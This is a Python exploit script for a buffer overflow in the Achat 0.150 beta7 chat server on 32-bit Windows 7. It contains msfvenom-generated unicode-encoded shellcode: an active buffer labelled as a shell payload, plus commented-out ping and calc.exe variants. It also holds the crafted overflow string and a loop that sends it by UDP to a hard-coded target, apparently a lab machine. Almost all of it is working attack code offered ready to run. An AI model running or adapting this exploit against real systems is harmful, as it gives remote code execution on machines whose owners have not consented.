#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 byte

# Shell.ps1
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x4b\x4c\x48\x68\x51\x72"
buf += b"\x6b\x50\x4d\x30\x49\x70\x53\x30\x35\x39\x7a\x45\x30"
buf += b"\x31\x77\x50\x43\x34\x32\x6b\x6e\x70\x6e\x50\x44\x4b"
buf += b"\x70\x52\x7a\x6c\x72\x6b\x52\x32\x4e\x34\x54\x4b\x43"
buf += b"\x42\x6d\x58\x5a\x6f\x38\x37\x4f\x5a\x6f\x36\x30\x31"
buf += b"\x39\x6f\x46\x4c\x4f\x4c\x53\x31\x73\x4c\x79\x72\x4c"
buf += b"\x6c\x4f\x30\x46\x61\x48\x4f\x4c\x4d\x49\x71\x59\x37"
buf += b"\x78\x62\x39\x62\x6f\x62\x4f\x67\x64\x4b\x61\x42\x4c"
buf += b"\x50\x74\x4b\x4f\x5a\x6d\x6c\x44\x4b\x50\x4c\x6b\x61"
buf += b"\x33\x48\x6a\x43\x4d\x78\x5a\x61\x36\x71\x42\x31\x32"
buf += b"\x6b\x72\x39\x4d\x50\x4a\x61\x47\x63\x32\x6b\x6f\x59"
buf += b"\x4b\x68\x48\x63\x4d\x6a\x4d\x79\x62\x6b\x6e\x54\x64"
buf += b"\x4b\x49\x71\x66\x76\x50\x31\x49\x6f\x44\x6c\x79\x31"
buf += b"\x48\x4f\x7a\x6d\x4b\x51\x68\x47\x30\x38\x39\x50\x61"
buf += b"\x65\x69\x66\x5a\x63\x63\x4d\x5a\x58\x4f\x4b\x31\x6d"
buf += b"\x6e\x44\x72\x55\x39\x54\x61\x48\x74\x4b\x30\x58\x6c"
buf += b"\x64\x39\x71\x66\x73\x70\x66\x52\x6b\x4a\x6c\x70\x4b"
buf += b"\x34\x4b\x62\x38\x4d\x4c\x79\x71\x38\x53\x62\x6b\x4c"
buf += b"\x44\x52\x6b\x69\x71\x46\x70\x35\x39\x61\x34\x4f\x34"
buf += b"\x4b\x74\x4f\x6b\x61\x4b\x63\x31\x4f\x69\x71\x4a\x72"
buf += b"\x31\x4b\x4f\x57\x70\x6f\x6f\x31\x4f\x6e\x7a\x44\x4b"
buf += b"\x6d\x42\x68\x6b\x72\x6d\x71\x4d\x52\x4a\x4b\x51\x54"
buf += b"\x4d\x61\x75\x55\x62\x6d\x30\x4d\x30\x49\x70\x72\x30"
buf += b"\x32\x48\x6e\x51\x64\x4b\x50\x6f\x42\x67\x39\x6f\x59"
buf += b"\x45\x55\x6b\x6c\x30\x48\x35\x55\x52\x4f\x66\x61\x58"
buf += b"\x43\x76\x74\x55\x77\x4d\x63\x6d\x79\x6f\x47\x65\x4f"
buf += b"\x4c\x6b\x56\x31\x6c\x59\x7a\x53\x50\x6b\x4b\x49\x50"
buf += b"\x31\x65\x6a\x65\x55\x6b\x4d\x77\x6d\x43\x43\x42\x30"
buf += b"\x6f\x52\x4a\x79\x70\x50\x53\x79\x6f\x67\x65\x30\x70"
buf += b"\x72\x4f\x33\x47\x31\x55\x62\x52\x43\x43\x61\x58\x50"
buf += b"\x65\x52\x4c\x52\x4c\x4f\x30\x4c\x6d\x6f\x73\x6b\x70"
buf += b"\x32\x49\x50\x65\x63\x48\x4b\x78\x72\x4e\x33\x35\x71"
buf += b"\x67\x4e\x4d\x72\x4f\x70\x62\x30\x6a\x52\x45\x32\x43"
buf += b"\x64\x34\x6d\x50\x32\x4e\x73\x35\x42\x54\x6e\x4e\x31"
buf += b"\x67\x73\x35\x52\x42\x31\x53\x72\x4c\x52\x49\x6f\x75"
buf += b"\x42\x4e\x62\x54\x4f\x39\x4c\x6e\x6f\x74\x62\x4f\x63"
buf += b"\x47\x42\x4e\x32\x4c\x50\x6f\x31\x51\x50\x64\x52\x53"
buf += b"\x43\x44\x73\x42\x32\x49\x32\x4e\x73\x37\x6f\x38\x4b"
buf += b"\x77\x32\x48\x62\x54\x44\x34\x50\x70\x4f\x4a\x6e\x4f"
buf += b"\x4e\x4f\x50\x31\x4c\x70\x6e\x4e\x6e\x51\x4c\x70\x6c"
buf += b"\x6e\x30\x31\x4c\x76\x4e\x4e\x6d\x69\x6c\x6f\x33\x43"
buf += b"\x30\x68\x4f\x75\x42\x4c\x32\x4c\x4c\x6e\x70\x70\x34"
buf += b"\x33\x30\x31\x6e\x47\x4c\x69\x6b\x50\x41\x41"

# Ping
'''
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x79\x6c\x4b\x38\x51\x72"
buf += b"\x69\x70\x69\x70\x69\x70\x33\x30\x72\x69\x39\x55\x4c"
buf += b"\x71\x49\x30\x70\x64\x34\x4b\x62\x30\x70\x30\x72\x6b"
buf += b"\x61\x42\x4a\x6c\x32\x6b\x4e\x72\x4d\x44\x72\x6b\x52"
buf += b"\x52\x4b\x78\x6c\x4f\x34\x77\x6d\x7a\x4d\x56\x30\x31"
buf += b"\x39\x6f\x44\x6c\x6d\x6c\x51\x51\x73\x4c\x6d\x32\x4e"
buf += b"\x4c\x6f\x30\x79\x31\x78\x4f\x6c\x4d\x69\x71\x67\x57"
buf += b"\x7a\x42\x7a\x52\x4f\x62\x70\x57\x52\x6b\x62\x32\x6a"
buf += b"\x70\x32\x6b\x30\x4a\x4d\x6c\x44\x4b\x4e\x6c\x6a\x71"
buf += b"\x63\x48\x68\x63\x6e\x68\x6d\x31\x77\x61\x70\x51\x32"
buf += b"\x6b\x6e\x79\x4b\x70\x79\x71\x38\x53\x32\x6b\x71\x39"
buf += b"\x7a\x78\x49\x53\x4c\x7a\x6f\x59\x74\x4b\x50\x34\x42"
buf += b"\x6b\x4d\x31\x57\x66\x30\x31\x39\x6f\x74\x6c\x57\x51"
buf += b"\x66\x6f\x7a\x6d\x6d\x31\x79\x37\x6c\x78\x59\x50\x73"
buf += b"\x45\x49\x66\x4d\x33\x43\x4d\x4a\x58\x4f\x4b\x61\x6d"
buf += b"\x4c\x64\x72\x55\x49\x54\x72\x38\x62\x6b\x32\x38\x4e"
buf += b"\x44\x4d\x31\x59\x43\x31\x56\x42\x6b\x4a\x6c\x50\x4b"
buf += b"\x72\x6b\x61\x48\x6b\x6c\x5a\x61\x56\x73\x42\x6b\x6b"
buf += b"\x54\x72\x6b\x4b\x51\x36\x70\x71\x79\x4d\x74\x6f\x34"
buf += b"\x4c\x64\x51\x4b\x51\x4b\x70\x61\x32\x39\x6f\x6a\x6f"
buf += b"\x61\x4b\x4f\x59\x50\x31\x4f\x31\x4f\x61\x4a\x72\x6b"
buf += b"\x6c\x52\x7a\x4b\x32\x6d\x4f\x6d\x71\x5a\x79\x71\x54"
buf += b"\x4d\x45\x35\x78\x32\x59\x70\x6b\x50\x4b\x50\x72\x30"
buf += b"\x73\x38\x50\x31\x32\x6b\x32\x4f\x64\x47\x39\x6f\x68"
buf += b"\x55\x45\x6b\x58\x70\x38\x35\x77\x32\x72\x36\x43\x38"
buf += b"\x77\x36\x52\x75\x67\x4d\x73\x6d\x69\x6f\x66\x75\x4d"
buf += b"\x6c\x49\x76\x51\x6c\x59\x7a\x51\x70\x4b\x4b\x77\x70"
buf += b"\x52\x55\x6b\x55\x45\x6b\x4e\x67\x4d\x43\x64\x32\x72"
buf += b"\x4f\x70\x6a\x6b\x50\x52\x33\x6b\x4f\x38\x55\x64\x30"
buf += b"\x50\x69\x72\x4e\x4f\x77\x6f\x30\x30\x31\x50\x30\x4c"
buf += b"\x6e\x4e\x51\x4e\x50\x4e\x4e\x30\x31\x30\x36\x4c\x6e"
buf += b"\x4c\x79\x49\x70\x41\x41"
'''

# Calc.exe
'''
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"
'''


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.129.218.73', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()